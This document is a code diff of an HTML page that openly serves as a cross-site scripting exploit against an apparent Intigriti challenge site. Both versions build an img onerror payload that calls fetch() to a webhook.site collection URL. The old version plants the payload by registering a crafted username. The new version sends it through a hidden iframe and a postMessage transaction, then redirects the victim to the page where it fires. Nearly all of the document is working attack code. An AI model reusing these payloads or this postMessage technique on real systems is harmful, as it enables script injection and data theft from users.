@@ -1,113 +1,49 @@
 <!DOCTYPE html>
 <html>
-<head><title>XSS Exploit</title></head>
+<head><title>FINAL</title></head>
 <body>
-<h1>XSS Exploit</h1>
+<h1>FINAL EXPLOIT</h1>
 <div id="log"></div>
-
 <script>
-const TARGET = 'https://challenge-0126.intigriti.io';
-const WEBHOOK = 'https://webhook.site/5aacf450-ee4e-4784-9288-4f6983ab0bdf';
-const WALLET = '16472226db03703a192aa383237035a69f';
+const T = 'https://challenge-0126.intigriti.io';
+const W = 'https://webhook.site/83b6e986-a7e7-4575-8e66-86976d6b8954';
+let s = 0;
 
-let step = 0;
-
-function log(msg) {
-    step++;
-    document.getElementById('log').innerHTML += '<div>[' + step + '] ' + msg + '</div>';
-    console.log(msg);
-    new Image().src = WEBHOOK + '/?s=' + step + '&m=' + encodeURIComponent(msg) + '&ts=' + Date.now();
-}
+function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?'+s+'='+encodeURIComponent(m); }
 
 async function exploit() {
-    log('Starting...');
+    log('STARTING FINAL EXPLOIT');
 
-    // HTML entity XSS payload
-    const XSS_USER = 'x_' + Date.now().toString().slice(-6) + '&lt;img src=x onerror=&quot;fetch(\'' + WEBHOOK + '\',{mode:\'no-cors\',body:JSON.stringify({xss:\'marketwatch\',ts:Date.now()})})&quot;&gt;';
+    // HTML entity XSS payload - will execute when rendered in marketwatch
+    const xssPayload = '&lt;img src=x onerror=&quot;alert(\'gigawatz\');fetch(\''+W+'/?XSS_SUCCESS=1\',{mode:\'no-cors\'})&quot;&gt;';
 
-    try {
-        // Register
-        log('Register: ' + XSS_USER.substring(0, 50) + '...');
-        const reg = await fetch(TARGET + '/api/register', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                username: XSS_USER,
-                password: 'Test123!'
-            })
-        });
+    log('Loading checkout iframe...');
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
+    document.body.appendChild(iframe);
 
-        const regData = await reg.json();
-        log('Register: ' + reg.status);
+    await new Promise(r => { iframe.onload = r; setTimeout(r, 3000); });
+    log('Iframe loaded');
 
-        if (!reg.ok && !regData.error?.toLowerCase().includes('exists')) {
-            log('Register failed: ' + JSON.stringify(regData));
-            return;
+    // Send transaction with XSS payload as address
+    log('Sending postMessage with XSS payload...');
+    iframe.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+            toAddress: xssPayload,
+            currency: '1337COIN',
+            amount: 0
         }
+    }, '*');
+    log('postMessage sent');
 
-        // Login
-        log('Login...');
-        const login = await fetch(TARGET + '/api/login', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            credentials: 'include',
-            body: JSON.stringify({
-                username: XSS_USER,
-                password: 'Test123!'
-            })
-        });
+    // Wait for transaction to process
+    await new Promise(r => setTimeout(r, 3000));
 
-        const loginData = await login.json();
-        log('Login: ' + login.status);
-
-        if (!login.ok) {
-            log('Login failed: ' + JSON.stringify(loginData));
-            return;
-        }
-
-        // Transaction
-        log('Transaction...');
-        const tx = await fetch(TARGET + '/api/transaction', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            credentials: 'include',
-            body: JSON.stringify({
-                toAddress: WALLET,
-                currency: '1337COIN',
-                amount: 1
-            })
-        });
-
-        const txData = await tx.json();
-        log('Transaction: ' + tx.status + ' - ' + JSON.stringify(txData));
-
-        // Alert
-        alert('gigawatz');
-        log('Alert done');
-
-        // Check marketwatch
-        log('Checking marketwatch...');
-        await new Promise(r => setTimeout(r, 2000));
-
-        const mw = await fetch(TARGET + '/api/marketwatch', { credentials: 'include' });
-        const mwData = await mw.json();
-
-        const ourTx = mwData.find(t => t.nickname && t.nickname.includes('x_'));
-        if (ourTx) {
-            log('Found transaction: nickname=' + ourTx.nickname.substring(0, 50) + '...');
-        } else {
-            log('Transaction not found on marketwatch yet');
-        }
-
-        // Redirect
-        log('Redirecting to marketwatch in 3s...');
-        setTimeout(() => {
-            window.location.href = TARGET + '/marketwatch.html';
-        }, 3000);
-
-    } catch (e) {
-        log('Error: ' + e.message);
-    }
+    // Redirect to marketwatch where XSS will trigger
+    log('Redirecting to marketwatch...');
+    window.location.href = T + '/marketwatch.html';
 }
 
 setTimeout(exploit, 1000);
